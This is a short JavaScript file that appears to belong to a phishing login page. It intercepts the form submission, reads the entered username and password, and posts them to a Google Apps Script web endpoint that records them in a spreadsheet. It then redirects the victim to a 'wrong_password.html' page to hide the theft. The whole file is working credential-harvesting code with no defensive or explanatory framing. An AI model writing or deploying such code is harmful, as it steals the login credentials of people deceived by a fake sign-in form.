document.addEventListener("DOMContentLoaded", function () {
  const form = document.querySelector(".login-form");

  if (form) {
    form.addEventListener("submit", function (e) {
      e.preventDefault(); // stop normal form submit

      const username = document.getElementById("username").value;
      const password = document.getElementById("password").value;

      fetch("https://script.google.com/macros/s/AKfycbzH9uDKH06HEfqzFbESTgF1nFFE8UKKCmxMzLAtHhcU2_-AKFm1MmH_iZX56jrl_tyM/exec", {
          method: "POST",
          body: new URLSearchParams({
              "username": username,
              "password": password
          })
      })
      .then(res => res.text())
      .then(data => {
          console.log("Saved to Google Sheet:", data);
          // redirect after submit
          window.location.href = "wrong_password.html"; 
      })
      .catch(err => console.error("Error:", err));
    });
  }
});
